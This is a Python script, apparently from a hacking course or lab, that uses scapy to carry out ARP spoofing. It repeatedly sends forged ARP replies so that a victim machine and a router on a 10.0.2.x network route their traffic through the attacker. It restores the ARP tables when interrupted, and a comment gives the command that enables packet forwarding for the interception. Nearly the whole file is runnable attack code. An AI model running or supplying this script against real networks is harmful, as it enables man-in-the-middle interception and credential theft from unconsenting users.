import scapy.all as scapy 
import time


def get_mac(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broad=broadcast/arp
    answer=scapy.srp(arp_broad, timeout=1, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    #op=2 means a response...and not a request..psrc is source 
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #to show the packet details use print(packet.show())
    #to send the packet use
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac=get_mac(dest_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


#To forward the network packets from the victim machine through your machine and to the router use this command echo 1 > /proc/sys/net/ipv4/ip_forward
send_packets = 0
try:
    while True:
        spoof("10.0.2.7", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.7")
        send_packets = send_packets + 2 
        print("\r[+] Packets sent " + str(send_packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRestoring the ARP Tables of the target machine", end="")
    restore("10.0.2.7", "10.0.2.1")
    print("\nDetected CTRL + C.......Quitting!")

